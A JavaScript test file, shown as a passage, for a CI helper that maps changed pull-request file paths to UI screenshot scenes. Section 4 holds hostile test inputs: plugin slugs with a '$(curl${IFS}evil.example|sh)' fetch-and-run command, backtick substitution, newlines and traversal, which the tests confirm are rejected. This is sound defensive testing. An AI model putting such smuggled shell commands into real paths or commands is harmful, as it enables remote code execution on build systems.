/* Tests for the UI change detection and scene mapping in detect.mjs.
 * Run: node test-detect.mjs */
import {
  isIgnoredPath,
  classifyPath,
  classifyLocaleKeys,
  classifyLocaleFile,
  mapPathsToScenes,
  collectChangedPaths,
  diffTopLevelKeys,
  diffLocaleKeys,
  ALL_SCENES,
  VIEW_SCENES,
  SETTINGS_TABS,
  VIEW_TO_SCENES,
} from './detect.mjs';

let failures = 0;
const check = (name, actual, expected) => {
  const actualStr = JSON.stringify(actual);
  const expectedStr = JSON.stringify(expected);
  if (actualStr !== expectedStr) {
    failures += 1;
    console.error(`FAIL ${name}:\n  expected: ${expectedStr}\n  got:      ${actualStr}`);
  } else {
    console.log(`ok   ${name}`);
  }
};

// 0. Scene catalog invariants
check('all settings tabs have unique scene names', new Set(SETTINGS_TABS.map((t) => t.scene)).size, SETTINGS_TABS.length);
check('ALL_SCENES is views plus settings tabs', ALL_SCENES, [...VIEW_SCENES, ...SETTINGS_TABS.map((t) => t.scene)]);
check('settings view expands to every settings scene', VIEW_TO_SCENES.settings, SETTINGS_TABS.map((t) => t.scene));

// 1. isIgnoredPath tests
check('test file in src is ignored', isIgnoredPath('src/App.contextSidebar.test.tsx'), true);
check('test file with spec is ignored', isIgnoredPath('src/components/foo.spec.ts'), true);
check('__tests__ file is ignored', isIgnoredPath('src/features/repositories/__tests__/repo.test.ts'), true);
check('src/test fixture is ignored', isIgnoredPath('src/test/setup.ts'), true);
check('markdown file is ignored', isIgnoredPath('README.md'), true);
check('nested markdown is ignored', isIgnoredPath('docs/plugins/v1-development.md'), true);
check('plugin readme is ignored', isIgnoredPath('examples/plugins/repo-custom-fields/README.md'), true);
check('plugin worker is ignored', isIgnoredPath('examples/plugins/markdown-exporter/worker.js'), true);
check('plugin ui readme is ignored', isIgnoredPath('examples/plugins/repo-custom-fields/ui/README.md'), true);
check('version-info.xml is ignored', isIgnoredPath('version-info.xml'), true);
check('LICENSE is ignored', isIgnoredPath('LICENSE'), true);
check('workflow is ignored', isIgnoredPath('.github/workflows/ci.yml'), true);
check('vscode is ignored', isIgnoredPath('.vscode/settings.json'), true);
check('tsconfig is ignored', isIgnoredPath('tsconfig.json'), true);
check('electron backend is ignored', isIgnoredPath('electron/main.js'), true);
check('electron preload is ignored', isIgnoredPath('electron/preload.js'), true);
check('LandingPage is ignored', isIgnoredPath('LandingPage/index.html'), true);
check('backend service is ignored', isIgnoredPath('src/services/logger.ts'), true);
check('store persistence is ignored', isIgnoredPath('src/store/persistence/shardStorage.ts'), true);
check('store normalizers is ignored', isIgnoredPath('src/store/normalizers/persistedState.ts'), true);
check('types are ignored', isIgnoredPath('src/types/index.ts'), true);
check('store types are ignored', isIgnoredPath('src/store/types.ts'), false);
check('non-UI utils are ignored', isIgnoredPath('src/utils/lanAddress.ts'), true);
check('crypto utils are ignored', isIgnoredPath('src/utils/cryptoRandom.ts'), true);
check('clipboard utils are ignored', isIgnoredPath('src/utils/clipboardUtils.ts'), true);
check('polyfills is ignored', isIgnoredPath('src/polyfills.ts'), true);
check('package.json is ignored', isIgnoredPath('package.json'), true);
check('package-lock.json is ignored', isIgnoredPath('package-lock.json'), true);

check('UI component is not ignored', isIgnoredPath('src/components/GistView.tsx'), false);
check('UI helper repoSearch is not ignored', isIgnoredPath('src/utils/repoSearch.ts'), false);
check('plugin UI index.js is not ignored', isIgnoredPath('examples/plugins/repo-custom-fields/ui/index.js'), false);
check('plugin UI style.css is not ignored', isIgnoredPath('examples/plugins/repo-custom-fields/ui/style.css'), false);
check('plugin UI index.html is not ignored', isIgnoredPath('examples/plugins/repo-custom-fields/ui/index.html'), false);
check('plugin manifest is not ignored', isIgnoredPath('examples/plugins/repo-custom-fields/manifest.json'), false);
check('index.css is not ignored', isIgnoredPath('src/index.css'), false);
check('themeTokens is not ignored', isIgnoredPath('src/types/themeTokens.ts'), false);
check('tailwind config is not ignored', isIgnoredPath('tailwind.config.js'), false);

// 2. classifyPath tests — top-level views
check('gists component', classifyPath('src/components/GistView.tsx'), 'gists');
check('gists feature', classifyPath('src/features/gists/hooks/useGist.ts'), 'gists');
check('gists slice', classifyPath('src/store/slices/gistSlice.ts'), 'gists');
check('gists helper', classifyPath('src/utils/gistUtils.ts'), 'gists');

check('releases component', classifyPath('src/components/ReleaseTimeline.tsx'), 'releases');
check('releases asset filter', classifyPath('src/components/AssetFilterManager.tsx'), 'releases');
check('releases feature', classifyPath('src/features/releases/hooks/useReleases.ts'), 'releases');
check('releases asset helper', classifyPath('src/utils/releaseAssets.ts'), 'releases');

check('forks component', classifyPath('src/components/ForkTimeline.tsx'), 'forks');
check('forks feature', classifyPath('src/features/forks/hooks/useForks.ts'), 'forks');

check('discovery component', classifyPath('src/components/DiscoveryView.tsx'), 'discovery');
check('discovery subscription card', classifyPath('src/components/SubscriptionRepoCard.tsx'), 'discovery');
check('discovery feed modal', classifyPath('src/components/TelegramMessageModal.tsx'), 'discovery');
check('discovery feed settings modal', classifyPath('src/components/XTweetSettingsModal.tsx'), 'discovery');
check('discovery feature', classifyPath('src/features/discovery/hooks/useDiscovery.ts'), 'discovery');
check('discovery helper', classifyPath('src/utils/discoveryFeeds.ts'), 'discovery');

check('repositories list', classifyPath('src/components/RepositoryList.tsx'), 'repositories');
check('repositories card', classifyPath('src/components/RepositoryCard.tsx'), 'repositories');
check('repositories bulk toolbar', classifyPath('src/components/BulkActionToolbar.tsx'), 'repositories');
check('repositories chat feature', classifyPath('src/features/repository-chat/components/ChatSheet.tsx'), 'repositories');
check('repositories search helper', classifyPath('src/utils/repoSearch.ts'), 'repositories');
check('repositories card actions helper', classifyPath('src/utils/repositoryCardActions.ts'), 'repositories');
check('repositories category helper', classifyPath('src/utils/categoryUtils.ts'), 'repositories');

// 3. classifyPath — Settings tabs map panel-by-panel
check('settings shell maps to whole settings view', classifyPath('src/components/SettingsPanel.tsx'), 'settings');
check('settings feature hook is deferred (follows the panels)', classifyPath('src/features/settings/hooks/useSettings.ts'), 'deferred');
check('configuration slice maps to settings', classifyPath('src/store/slices/configurationSlice.ts'), 'settings');
check('general panel maps to general scene', classifyPath('src/components/settings/GeneralPanel.tsx'), ['settings-general']);
check('appearance panel maps to appearance scene', classifyPath('src/components/settings/AppearancePanel.tsx'), ['settings-appearance']);
check('theme settings card maps to appearance scene', classifyPath('src/components/settings/ThemeSettingsCard.tsx'), ['settings-appearance']);
check('repository card actions maps to appearance scene', classifyPath('src/components/settings/RepositoryCardActionsSettings.tsx'), ['settings-appearance']);
check('star sync panel maps to star-sync scene', classifyPath('src/components/settings/StarSyncPanel.tsx'), ['settings-star-sync']);
check('ai config panel maps to ai scene', classifyPath('src/components/settings/AIConfigPanel.tsx'), ['settings-ai']);
check('webdav panel maps to webdav scene', classifyPath('src/components/settings/WebDAVPanel.tsx'), ['settings-webdav']);
check('backup panel maps to backup scene', classifyPath('src/components/settings/BackupPanel.tsx'), ['settings-backup']);
check('backend panel maps to backend scene', classifyPath('src/components/settings/BackendPanel.tsx'), ['settings-backend']);
check('category panel maps to category scene', classifyPath('src/components/settings/CategoryPanel.tsx'), ['settings-category']);
check('menu panel maps to menu scene', classifyPath('src/components/settings/MenuManagementPanel.tsx'), ['settings-menu']);
check('data panel maps to data scene', classifyPath('src/components/settings/DataManagementPanel.tsx'), ['settings-data']);
check('logs panel maps to logs scene', classifyPath('src/components/settings/DiagnosticLogsPanel.tsx'), ['settings-logs']);
check('network panel maps to network scene', classifyPath('src/components/settings/NetworkPanel.tsx'), ['settings-network']);
check('mcp panel maps to mcp scene', classifyPath('src/components/settings/McpSettingsPanel.tsx'), ['settings-mcp']);
check('vector search maps to vector-search scene', classifyPath('src/components/settings/VectorSearchSettings.tsx'), ['settings-vector-search']);
check('plugin settings panel maps to plugins scene', classifyPath('src/components/settings/PluginSettingsPanel.tsx'), ['settings-plugins']);
check('plugin icon picker maps to plugins scene', classifyPath('src/components/settings/PluginIconPickerDialog.tsx'), ['settings-plugins']);
check('plugin marketplace maps to plugins scene', classifyPath('src/components/settings/PluginMarketplaceDialog.tsx'), ['settings-plugins']);
check('push categories modal maps to star-sync scene', classifyPath('src/components/settings/PushCategoriesModal.tsx'), ['settings-star-sync']);
check('include keys toggle spans backup and data scenes', classifyPath('src/components/settings/IncludeKeysToggle.tsx'), ['settings-backup', 'settings-data']);
check('unknown settings component falls back to whole settings view', classifyPath('src/components/settings/SomeFuturePanel.tsx'), ['settings']);

// 4. classifyPath — plugin host code vs. individual plugin pages
check('plugin infra touches repositories and plugins settings', classifyPath('src/plugins/pluginIcons.ts'), ['repositories', 'settings-plugins']);
check('plugin client touches repositories and plugins settings', classifyPath('src/plugins/pluginClient.ts'), ['repositories', 'settings-plugins']);
check('plugin feature touches repositories and plugins settings', classifyPath('src/features/plugins/hooks/usePluginAI.ts'), ['repositories', 'settings-plugins']);
check('plugin page viewer touches repositories and plugins settings', classifyPath('src/components/PluginPageViewer.tsx'), ['repositories', 'settings-plugins']);
check('plugin page modal touches repositories and plugins settings', classifyPath('src/components/PluginPageModal.tsx'), ['repositories', 'settings-plugins']);

check('known plugin ui maps to its own spec', classifyPath('examples/plugins/repo-custom-fields/ui/index.js'), 'plugin:repo-custom-fields');
check('known plugin manifest maps to spec plus plugins settings', classifyPath('examples/plugins/repo-custom-fields/manifest.json'), ['settings-plugins', 'plugin:repo-custom-fields']);
check('another plugin ui maps to its own spec', classifyPath('examples/plugins/repo-info-card/ui/index.html'), 'plugin:repo-info-card');
check('third plugin ui maps to its own spec', classifyPath('examples/plugins/repo-insights/ui/style.css'), 'plugin:repo-insights');
check('newly added plugin ui maps to its own spec', classifyPath('examples/plugins/brand-new-plugin/ui/index.html'), 'plugin:brand-new-plugin');
check('newly added plugin manifest maps to spec plus plugins settings', classifyPath('examples/plugins/brand-new-plugin/manifest.json'), ['settings-plugins', 'plugin:brand-new-plugin']);
check('plugin nested ui file maps to its own spec', classifyPath('examples/plugins/repo-custom-fields/ui/lib/widget.js'), 'plugin:repo-custom-fields');
check('plugin non-ui file is ignored by classifier', classifyPath('examples/plugins/repo-custom-fields/scripts/build.js'), null);
check('shell-metacharacter plugin slug never becomes a spec', classifyPath('examples/plugins/$(curl${IFS}evil.example|sh)/ui/index.html'), null);
check('backtick plugin slug never becomes a spec', classifyPath('examples/plugins/`id`/ui/index.html'), null);
check('newline plugin slug never becomes a spec', classifyPath('examples/plugins/foo\nbar/ui/index.html'), null);
check('traversal plugin slug never becomes a spec', classifyPath('examples/plugins/foo..bar/ui/index.html'), null);
check('space plugin slug never becomes a spec', classifyPath('examples/plugins/bad slug/ui/index.html'), null);
check('malicious plugin manifest maps to nothing at all', mapPathsToScenes([
  'examples/plugins/$(curl${IFS}evil.example|sh)/manifest.json',
  'examples/plugins/$(curl${IFS}evil.example|sh)/ui/index.html',
]), []);

// 5. classifyPath — locales fall back to namespace scope without a key diff
check('repositories locale fallback covers appearance consumers', classifyPath('src/locales/zh/repositories.json'), ['repositories', 'settings-appearance']);
check('gists locale', classifyPath('src/locales/zh/gists.json'), ['gists']);
check('releases locale fallback covers cross-view consumers', classifyPath('src/locales/en/releases.json'), ['releases', 'repositories', 'forks', 'discovery']);
check('forks locale', classifyPath('src/locales/ja/forks.json'), ['forks']);
check('discovery locale', classifyPath('src/locales/zh/discovery.json'), ['discovery']);
check('settings locale', classifyPath('src/locales/zh/settings.json'), ['repositories', 'settings']);
check('chat locale', classifyPath('src/locales/zh/chat.json'), ['repositories']);
check('search locale', classifyPath('src/locales/zh/search.json'), ['repositories']);
check('plugins locale mixes repositories and plugins settings', classifyPath('src/locales/zh/plugins.json'), ['repositories', 'settings-plugins', 'discovery']);
check('app locale is conservative global', classifyPath('src/locales/zh/app.json'), ['global']);
check('common locale is global', classifyPath('src/locales/zh/common.json'), ['global']);
check('login locale maps to the login scene', classifyPath('src/locales/zh/login.json'), ['login']);

// 6. classifyPath — state containers are deferred, global chrome is global
check('preference slice is deferred', classifyPath('src/store/slices/preferenceSlice.ts'), 'deferred');
check('auth slice is deferred', classifyPath('src/store/slices/authSlice.ts'), 'deferred');
check('unknown slice is deferred', classifyPath('src/store/slices/futureSlice.ts'), 'deferred');
check('initial state is deferred', classifyPath('src/store/initialState.ts'), 'deferred');
check('schema is deferred', classifyPath('src/store/schema.ts'), 'deferred');
check('timeline slice touches releases and forks', classifyPath('src/store/slices/timelineSlice.ts'), ['releases', 'forks']);

check('App.tsx is global', classifyPath('src/App.tsx'), 'global');
check('main.tsx is global', classifyPath('src/main.tsx'), 'global');
check('index.css is global', classifyPath('src/index.css'), 'global');
check('Header.tsx is global', classifyPath('src/components/Header.tsx'), 'global');
check('Modal.tsx is deferred (dialog shell, closed in demo)', classifyPath('src/components/Modal.tsx'), 'deferred');
check('UpdateChecker.tsx is deferred (update dialog, never open in demo)', classifyPath('src/components/UpdateChecker.tsx'), 'deferred');
check('UpdateNotificationBanner is deferred', classifyPath('src/components/UpdateNotificationBanner.tsx'), 'deferred');
check('DebugModeIndicator is deferred', classifyPath('src/components/DebugModeIndicator.tsx'), 'deferred');
check('MarkdownRenderer is deferred (collapsed notes / closed modals only)', classifyPath('src/components/MarkdownRenderer.tsx'), 'deferred');
check('BackToTop is deferred (hidden until scroll)', classifyPath('src/components/BackToTop.tsx'), 'deferred');
check('LoginScreen maps to the login scene', classifyPath('src/components/LoginScreen.tsx'), 'login');
check('login locale maps to the login scene', classifyPath('src/locales/zh/login.json'), ['login']);
check('token permissions helper spans settings-general and login', classifyPath('src/components/GitHubTokenPermissions.tsx'), ['settings-general', 'login']);
check('auto update check hook is deferred', classifyPath('src/hooks/useAutoUpdateCheck.ts'), 'deferred');
check('settings feature hooks are deferred', classifyPath('src/features/settings/hooks/useUpdateActions.ts'), 'deferred');
check('ui button is global', classifyPath('src/components/ui/button.tsx'), 'global');
check('tailwind.config.js is global', classifyPath('tailwind.config.js'), 'global');
check('vite.config.ts is global', classifyPath('vite.config.ts'), 'global');
check('themeTokens.ts is global', classifyPath('src/types/themeTokens.ts'), 'global');
check('markdownUtils.ts is deferred (conditional markdown surfaces)', classifyPath('src/utils/markdownUtils.ts'), 'deferred');
check('WorkspacePageHeader is global', classifyPath('src/components/WorkspacePageHeader.tsx'), 'global');
check('src/lib/utils.ts is global', classifyPath('src/lib/utils.ts'), 'global');
check('public asset is global', classifyPath('public/icon.svg'), 'global');
check('unclassified component falls back to global', classifyPath('src/components/FutureWidget.tsx'), 'global');
check('unclassified feature falls back to global', classifyPath('src/features/future/Foo.tsx'), 'global');
check('i18n infra is global (every page renders translations)', classifyPath('src/i18n/useT.ts'), 'global');
check('unmapped hook is deferred', classifyPath('src/hooks/useDialog.tsx'), 'deferred');
check('unmapped util is deferred', classifyPath('src/utils/repoUtils.ts'), 'deferred');
check('store wiring is deferred', classifyPath('src/store/useAppStore.ts'), 'deferred');
check('mapped release hook keeps its precise scene', classifyPath('src/hooks/useReleaseArtifactActions.ts'), 'releases');
check('i18n diff maps to all scenes', mapPathsToScenes(['src/i18n/useT.ts']), ALL_SCENES);
check('i18n diff beside panels stays global', mapPathsToScenes(['src/i18n/useT.ts', 'src/components/GistView.tsx']), ALL_SCENES);

// 7. classifyLocaleKeys — key-level mapping within a namespace
check('app key maps to its panel scene', classifyLocaleKeys('app', ['pluginSettingsPanel']), ['settings-plugins']);
check('app data panel key maps to data scene', classifyLocaleKeys('app', ['dataManagementPanel']), ['settings-data']);
check('app theme key maps to appearance scene', classifyLocaleKeys('app', ['themeSettingsCard']), ['settings-appearance']);
check('app general panel key spans general and appearance', classifyLocaleKeys('app', ['generalPanel']), ['settings-general', 'settings-appearance']);
check('app menu panel key spans menu and appearance', classifyLocaleKeys('app', ['menuManagementPanel']), ['settings-menu', 'settings-appearance']);
check('app category utils key spans repositories and category tab', classifyLocaleKeys('app', ['categoryUtils']), ['repositories', 'settings-category']);
check('app asset filter key spans releases and repositories', classifyLocaleKeys('app', ['assetFilterManager']), ['releases', 'repositories']);
check('app plugin page viewer key spans repositories and plugins settings', classifyLocaleKeys('app', ['pluginPageViewer']), ['repositories', 'settings-plugins']);
check('app shell key maps to the settings view', classifyLocaleKeys('app', ['settingsPanel']), ['settings']);
check('app header key is global', classifyLocaleKeys('app', ['header']), ['global']);
check('app markdown keys span their consumers', classifyLocaleKeys('app', ['markdownRenderer']), ['repositories', 'releases', 'discovery']);
check('unknown app key escalates to global', classifyLocaleKeys('app', ['somethingBrandNew']), ['global']);
check('mixed known and unknown app keys escalate to global', classifyLocaleKeys('app', ['dataManagementPanel', 'somethingBrandNew']), ['settings-data', 'global']);
check('several app keys union their scenes', classifyLocaleKeys('app', ['pluginSettingsPanel', 'generalPanel']), ['settings-plugins', 'settings-general', 'settings-appearance']);
check('settings hook key maps to its tab', classifyLocaleKeys('settings', ['useMcpActions']), ['settings-mcp']);
check('star sync hook key spans its tab and repositories', classifyLocaleKeys('settings', ['useStarSyncActions']), ['settings-star-sync', 'repositories']);
check('unknown settings key escalates to the settings view', classifyLocaleKeys('settings', ['futureHook']), ['repositories', 'settings']);
check('unknown releases key covers every consumer view', classifyLocaleKeys('releases', ['brandNewKey']), ['releases', 'repositories', 'forks', 'discovery']);
check('releaseCard key maps to releases', classifyLocaleKeys('releases', ['releaseCard']), ['releases']);
check('releaseTimeline key maps to releases', classifyLocaleKeys('releases', ['releaseTimeline']), ['releases']);
check('unknown repositories key covers appearance consumers', classifyLocaleKeys('repositories', ['futureKey']), ['repositories', 'settings-appearance']);
check('unknown plugins key covers discovery consumers', classifyLocaleKeys('plugins', ['futureKey']), ['repositories', 'settings-plugins', 'discovery']);
check('plugins telegram key maps to discovery', classifyLocaleKeys('plugins', ['telegramMessageModal']), ['discovery']);
check('plugins action key maps to repositories and plugins settings', classifyLocaleKeys('plugins', ['applyPluginActionResult']), ['repositories', 'settings-plugins']);
check('chat key maps to repositories', classifyLocaleKeys('chat', ['repositoryChatSheet']), ['repositories']);
check('namespace without table falls back to its scope', classifyLocaleKeys('gists', ['gistViewAnything']), ['gists']);
check('common namespace falls back to global', classifyLocaleKeys('common', ['anything']), ['global']);
check('releases fork keys map to forks', classifyLocaleKeys('releases', ['forkCard', 'forkTimeline']), ['forks']);
check('releases subscription key maps to discovery', classifyLocaleKeys('releases', ['subscriptionRepoCard']), ['discovery']);
check('releases sheet key spans releases and repositories', classifyLocaleKeys('releases', ['repositoryReleaseSheet']), ['releases', 'repositories']);
check('repositories card-action hook key maps to repositories', classifyLocaleKeys('repositories', ['useRepositoryCardActions']), ['repositories']);
check('repositories card key spans repositories and appearance', classifyLocaleKeys('repositories', ['repositoryCard']), ['repositories', 'settings-appearance']);
check('repositories keys outside the table use the namespace fallback', classifyLocaleKeys('repositories', ['brandNewKey']), ['repositories', 'settings-appearance']);
check('common fork timeline key maps to forks', classifyLocaleKeys('common', ['useForkTimelineActions']), ['forks']);

// 8. classifyLocaleFile — key diff available, empty, or unavailable
check('locale file with key diff maps precisely', classifyLocaleFile('src/locales/zh/app.json', ['pluginSettingsPanel']), ['settings-plugins']);
check('locale file whose keys did not change maps to nothing', classifyLocaleFile('src/locales/zh/app.json', []), []);
check('locale file without key diff uses namespace fallback', classifyLocaleFile('src/locales/zh/app.json'), ['global']);
check('gists locale with unknown keys stays in gists', classifyLocaleFile('src/locales/zh/gists.json', ['newKey']), ['gists']);
check('non-locale path classifies to nothing', classifyLocaleFile('src/components/GistView.tsx'), []);

// 9. diffTopLevelKeys
check('detects added and changed keys', diffTopLevelKeys(
  JSON.stringify({ a: 1, b: { x: 1 } }),
  JSON.stringify({ a: 1, b: { x: 2 }, c: 3 }),
), ['b', 'c']);
check('detects removed keys', diffTopLevelKeys(
  JSON.stringify({ a: 1, gone: 2 }),
  JSON.stringify({ a: 1 }),
), ['gone']);
check('formatting-only change yields no keys', diffTopLevelKeys(
  '{\n  "a": 1\n}',
  '{"a":1}',
), []);
check('invalid json is treated conservatively', diffTopLevelKeys('not json', '{"a":1}'), ['a']);

// 10. mapPathsToScenes — precision and expansion
check('empty paths produces empty scenes', mapPathsToScenes([]), []);
check('pure documentation produces empty scenes', mapPathsToScenes([
  'README.md',
  'docs/plugins/v1-development.md',
]), []);
check('pure tests produces empty scenes', mapPathsToScenes([
  'src/services/logger.test.ts',
  'src/components/GistView.test.tsx',
]), []);
check('pure backend service produces empty scenes', mapPathsToScenes([
  'src/services/logger.ts',
  'src/store/persistence/shardStorage.ts',
  'src/utils/lanAddress.ts',
]), []);

check('gists change maps only to gists', mapPathsToScenes([
  'src/components/GistView.tsx',
]), ['gists']);

check('gists change with tests and docs still maps only to gists', mapPathsToScenes([
  'src/components/GistView.tsx',
  'src/components/GistView.test.tsx',
  'README.md',
]), ['gists']);

check('releases change maps only to releases', mapPathsToScenes([
  'src/components/ReleaseTimeline.tsx',
  'src/components/AssetFilterManager.tsx',
]), ['releases']);

check('forks change maps only to forks', mapPathsToScenes([
  'src/components/ForkTimeline.tsx',
]), ['forks']);

check('discovery change maps only to discovery', mapPathsToScenes([
  'src/components/DiscoveryView.tsx',
  'src/locales/zh/discovery.json',
]), ['discovery']);

check('one settings panel maps to one tab scene', mapPathsToScenes([
  'src/components/settings/DataManagementPanel.tsx',
]), ['settings-data']);

check('two settings panels map to their two tab scenes', mapPathsToScenes([
  'src/components/settings/AIConfigPanel.tsx',
  'src/components/settings/NetworkPanel.tsx',
]), ['settings-ai', 'settings-network']);

check('settings shell maps to every settings tab', mapPathsToScenes([
  'src/components/SettingsPanel.tsx',
]), [...SETTINGS_TABS.map((t) => t.scene)]);

check('repositories change maps to repositories-light and repositories-dark', mapPathsToScenes([
  'src/components/RepositoryList.tsx',
]), ['repositories-light', 'repositories-dark']);

check('plugin ui change maps only to that plugin', mapPathsToScenes([
  'examples/plugins/repo-custom-fields/ui/index.js',
]), ['plugin:repo-custom-fields']);

check('plugin ui change with worker and readme still maps to its own scene', mapPathsToScenes([
  'examples/plugins/repo-custom-fields/ui/style.css',
  'examples/plugins/markdown-exporter/worker.js',
  'examples/plugins/repo-custom-fields/README.md',
]), ['plugin:repo-custom-fields']);

check('new plugin addition maps to its pages plus plugins settings', mapPathsToScenes([
  'examples/plugins/brand-new-plugin/manifest.json',
  'examples/plugins/brand-new-plugin/ui/index.html',
]), ['settings-plugins', 'plugin:brand-new-plugin']);

check('plugin host change maps to repositories and plugins settings', mapPathsToScenes([
  'src/components/PluginPageModal.tsx',
]), ['repositories-light', 'repositories-dark', 'settings-plugins']);

check('multiple views touched maps to the union of their scenes', mapPathsToScenes([
  'src/components/GistView.tsx',
  'src/components/ReleaseTimeline.tsx',
]), ['gists', 'releases']);

check('global UI change maps to ALL_SCENES', mapPathsToScenes([
  'src/components/Header.tsx',
]), ALL_SCENES);

check('view change combined with global UI maps to ALL_SCENES', mapPathsToScenes([
  'src/components/GistView.tsx',
  'src/index.css',
]), ALL_SCENES);

check('global change still includes plugin specs from the same diff', mapPathsToScenes([
  'src/components/Header.tsx',
  'examples/plugins/repo-insights/ui/index.html',
]), [...ALL_SCENES, 'plugin:repo-insights']);

check('PR 575 commit 8f2fbc18 (with Modal.tsx) follows the concrete components', mapPathsToScenes([
  'examples/plugins/repo-custom-fields/README.md',
  'examples/plugins/repo-custom-fields/manifest.json',
  'examples/plugins/repo-custom-fields/ui/index.js',
  'examples/plugins/repo-custom-fields/ui/style.css',
  'src/components/Modal.tsx',
  'src/components/PluginPageModal.test.tsx',
  'src/components/PluginPageModal.tsx',
]), ['repositories-light', 'repositories-dark', 'settings-plugins', 'plugin:repo-custom-fields']);

check('PR 575 commit cfd97a2d (docs only) maps to empty scenes', mapPathsToScenes([
  'docs/plugins/v1-development.md',
  'examples/plugins/repo-custom-fields/README.md',
]), []);

// 11. mapPathsToScenes — deferred state containers
check('state-only diff falls back to all scenes', mapPathsToScenes([
  'src/store/slices/preferenceSlice.ts',
]), ALL_SCENES);

check('state diff alongside components follows the components', mapPathsToScenes([
  'src/store/slices/preferenceSlice.ts',
  'src/components/settings/PluginSettingsPanel.tsx',
]), ['settings-plugins']);

check('state diff alongside view components follows the views', mapPathsToScenes([
  'src/store/schema.ts',
  'src/components/RepositoryCard.tsx',
]), ['repositories-light', 'repositories-dark']);

check('deferred plus plugin spec escalates to global so no page is missed', mapPathsToScenes([
  'src/store/initialState.ts',
  'examples/plugins/repo-info-card/ui/index.html',
]), [...ALL_SCENES, 'plugin:repo-info-card']);

check('global i18n diff keeps plugin specs from the same diff', mapPathsToScenes([
  'src/i18n/useT.ts',
  'examples/plugins/repo-insights/ui/index.html',
]), [...ALL_SCENES, 'plugin:repo-insights']);

check('global i18n diff keeps plugin manifest specs', mapPathsToScenes([
  'src/i18n/useT.ts',
  'examples/plugins/repo-info-card/manifest.json',
]), [...ALL_SCENES, 'plugin:repo-info-card']);

// 12. mapPathsToScenes — locale key-level diffing
check('locale key diff maps only the affected settings tab', mapPathsToScenes(
  ['src/locales/zh/app.json'],
  { 'src/locales/zh/app.json': ['pluginSettingsPanel'] },
), ['settings-plugins']);

check('locale file with no visible key change maps to nothing', mapPathsToScenes(
  ['src/locales/zh/app.json'],
  { 'src/locales/zh/app.json': [] },
), []);

check('locale key diff for global keys still expands to all scenes', mapPathsToScenes(
  ['src/locales/zh/app.json'],
  { 'src/locales/zh/app.json': ['header'] },
), ALL_SCENES);

check('locale file without a key diff stays conservative', mapPathsToScenes(
  ['src/locales/zh/app.json'],
  {},
), ALL_SCENES);

check('view locale key diffs stay in their view', mapPathsToScenes(
  ['src/locales/zh/gists.json'],
  { 'src/locales/zh/gists.json': ['brandNewKey'] },
), ['gists']);

check('plugins locale keys map telegram to discovery only', mapPathsToScenes(
  ['src/locales/zh/plugins.json'],
  { 'src/locales/zh/plugins.json': ['telegramMessageModal'] },
), ['discovery']);

check('PR 577 zh/app.json icon-picker keys map to the plugins settings tab', mapPathsToScenes(
  ['src/locales/zh/app.json'],
  { 'src/locales/zh/app.json': ['pluginSettingsPanel'] },
), ['settings-plugins']);

// 13. mapPathsToScenes — the full PR 577 file list (simulated audit case)
const pr577Files = [
  'eslint.config.js',
  'src/components/BulkActionToolbar.tsx',
  'src/components/RepositoryCard.test.tsx',
  'src/components/RepositoryCard.tsx',
  'src/components/settings/DataManagementPanel.tsx',
  'src/components/settings/PluginIconPickerDialog.test.tsx',
  'src/components/settings/PluginIconPickerDialog.tsx',
  'src/components/settings/PluginSettingsPanel.tsx',
  'src/components/settings/RepositoryCardActionsSettings.test.tsx',
  'src/components/settings/RepositoryCardActionsSettings.tsx',
  'src/hooks/useDialog.tsx',
  'src/locales/de/app.json',
  'src/locales/de/repositories.json',
  'src/locales/en/app.json',
  'src/locales/en/repositories.json',
  'src/locales/es/app.json',
  'src/locales/es/repositories.json',
  'src/locales/fr/app.json',
  'src/locales/fr/repositories.json',
  'src/locales/ja/app.json',
  'src/locales/ja/repositories.json',
  'src/locales/ko/app.json',
  'src/locales/ko/repositories.json',
  'src/locales/pt-BR/app.json',
  'src/locales/pt-BR/repositories.json',
  'src/locales/ru/app.json',
  'src/locales/ru/repositories.json',
  'src/locales/zh-TW/app.json',
  'src/locales/zh-TW/repositories.json',
  'src/locales/zh/app.json',
  'src/locales/zh/repositories.json',
  'src/plugins/PluginIcon.tsx',
  'src/plugins/applyPluginActionResult.ts',
  'src/plugins/pluginIcons.test.tsx',
  'src/plugins/pluginIcons.ts',
  'src/store/initialState.ts',
  'src/store/normalizers/persistedState.ts',
  'src/store/persistence/options.ts',
  'src/store/schema.ts',
  'src/store/slices/preferenceSlice.ts',
  'src/store/types.ts',
  'src/types/index.ts',
  'src/types/repositoryCardActions.ts',
  'src/utils/repositoryCardActions.ts',
];
const pr577LocaleKeys = Object.fromEntries(
  pr577Files
    .filter((p) => p.endsWith('/app.json') || p.endsWith('/repositories.json'))
    .map((p) => [p, p.endsWith('/app.json') ? ['pluginSettingsPanel'] : ['repositoryCardActions']]),
);
check('PR 577 full diff maps to exactly the changed pages', mapPathsToScenes(pr577Files, pr577LocaleKeys), [
  'repositories-light',
  'repositories-dark',
  'settings-appearance',
  'settings-data',
  'settings-plugins',
]);

check('PR 577 diff without locale key diffs stays conservative', mapPathsToScenes(pr577Files), ALL_SCENES);

// 14. collectChangedPaths request selection tests (synchronize vs opened)
const beforeSha = '1111111111111111111111111111111111111111';
const headSha = '2222222222222222222222222222222222222222';

// Scenario A: PR has older UI commits, but the new push diff is docs only
const mockGhSyncDocsOnly = (args) => {
  const url = args[1];
  if (url.startsWith(`repos/owner/repo/compare/${beforeSha}...${headSha}`)) {
    return 'README.md\n';
  }
  if (url.startsWith('repos/owner/repo/pulls/123/files')) {
    // If PR files were incorrectly called instead of compare, it would return the older UI commit
    return 'src/components/GistView.tsx\nREADME.md\n';
  }
  return '';
};

const syncDocsPaths = collectChangedPaths({
  repo: 'owner/repo',
  pr: 123,
  action: 'synchronize',
  beforeSha,
  headSha,
  executor: mockGhSyncDocsOnly,
});
check('synchronize selects push diff instead of cumulative PR files', syncDocsPaths, ['README.md']);
check('synchronize with docs-only push yields no UI scenes', mapPathsToScenes(syncDocsPaths), []);

// Scenario B: PR opened event uses full PR file listing
const mockGhOpened = (args) => {
  const url = args[1];
  if (url.includes('length')) return '2';
  if (url.startsWith('repos/owner/repo/pulls/123/files')) {
    return 'src/components/GistView.tsx\nREADME.md\n';
  }
  return '';
};

const openedPaths = collectChangedPaths({
  repo: 'owner/repo',
  pr: 123,
  action: 'opened',
  beforeSha: '',
  headSha,
  executor: mockGhOpened,
});
check('opened event selects PR file list', openedPaths, ['src/components/GistView.tsx', 'README.md']);
check('opened event maps to relevant scene', mapPathsToScenes(openedPaths), ['gists']);

// Scenario C: synchronize push diff touching repoSearch UI helper
const mockGhSyncRepoSearch = (args) => {
  const url = args[1];
